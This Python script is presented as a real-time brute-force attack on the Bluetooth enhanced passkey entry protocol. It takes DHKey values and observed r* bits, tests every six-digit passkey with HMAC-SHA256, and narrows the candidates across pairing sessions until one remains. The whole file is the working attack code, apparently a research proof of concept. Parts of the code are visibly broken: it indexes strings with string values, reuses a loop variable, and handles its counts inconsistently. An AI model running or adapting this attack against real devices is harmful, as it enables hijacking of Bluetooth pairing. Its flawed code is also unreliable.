"""This is a realtime working of the brute-force attack on the enhanced passkey entry protocol. The user needs to
input DHKey values for every SSP session, the random integer values n' and the obtained r*. The attack displays the list of potential passkeys based
on the known r* bits."""

import hashlib
import hmac
import time

start_time = time.time()
"""datasets sample 
DHkey = "2c31a47b5779809ef44cb5eaaf5c3e43d5f8faad4a8794cb987e9b03745c78dd"
"""


def firstbrute(dhkey, passwords):
    dhkey_bin = str(bin(int(dhkey, 16)))
    dhkey_bin = dhkey_bin[2:]
    dhkey_bin = dhkey_bin.zfill(256)
    print("DHKEY: " + str(dhkey))
    count = 0
    ntmp = input("Enter random integers obtained separated by spaces: ")
    n = ntmp.split(" ")
    r = input("Enter obtained r* bits: ")
    y = list(r)
    nr = len(y)
    x = [0] * nr
    # Brute Force
    for i in range(0, 1000000):
        passbrute = str(i)
        if len(passbrute) < 6:
            passbrute = passbrute.zfill(6)
        passbrute = int(passbrute)
        pasb = str(bin(passbrute))
        msg_brute = bytes(pasb[2:22], "utf-8")
        key_brute = bytes(dhkey_bin, "utf-8")
        hb = hmac.new(key_brute, msg_brute, hashlib.sha256)
        hexdat_brute = hb.hexdigest()
        cb = str(bin(int(hexdat_brute, 16)))
        cb = cb[2:]
        cb = cb.zfill(256)
        for i in range(0, nr):
            x[i] = cb[n[i]]
        if x == y:
            passwords[count] = passbrute
            count = count + 1
    passwords = passwords[:count]
    count = count - 1
    print("No. of Potential Passkeys: " + str(len(passwords)))
    return passwords, count


def conbrute(count, dhkey, passwords):
    # Initialise Parameters
    newcount = 0
    dhkey_bin = str(bin(int(dhkey, 16)))
    dhkey_bin = dhkey_bin[2:]
    dhkey_bin = dhkey_bin.zfill(256)
    ntmp = input("Enter random integers obtained separated by spaces: ")
    n = ntmp.split(" ")
    print(n)
    r = input("Enter obtained r* bits: ")
    y = list(r)
    nr = len(y)
    x = [0] * nr

    # Brute Force Consecutive ssp session
    for i in range(count):
        passbrute = str(passwords[i])
        if len(passbrute) < 6:
            passbrute = passbrute.zfill(6)
        passbrute = int(passbrute)
        pasb = str(bin(passbrute))
        msg_brute = bytes(pasb[2:22], "utf-8")
        key_brute = bytes(dhkey_bin, "utf-8")
        hb = hmac.new(key_brute, msg_brute, hashlib.sha256)
        hexdat_brute = hb.hexdigest()
        cb = str(bin(int(hexdat_brute, 16)))
        cb = cb[2:]
        cb = cb.zfill(256)
        for i in range(0, nr):
            x[i] = cb[n[i]]
        if x == y:
            passwords[newcount] = passbrute
            newcount = newcount + 1
    return passwords, newcount


count = 0
tmp = 0
passwords = [0] * 1000000
# First Brute Force
dhkey = bytes(input("Enter DHkey: "), 'utf-8')
passwords, count = firstbrute(dhkey, passwords)
passwords = passwords[:count]
tmp = tmp + 0.5
print("First brute: " + str(count))

while count != 1:
    dhkey = bytes(input("Enter DHkey: "), 'utf-8')
    print("DHKEY: " + str(dhkey))
    tmp = tmp + 0.5
    passwords, count = conbrute(count, dhkey, passwords)
    passwords = passwords[:count]
    if count == 0:
        print("Error with values entered.")
        break
    print("No. of Potential Passkeys: " + str(len(passwords)))

print("Potential passkey list: " + str(passwords))
print("--- %s seconds ---" % (time.time() - start_time))
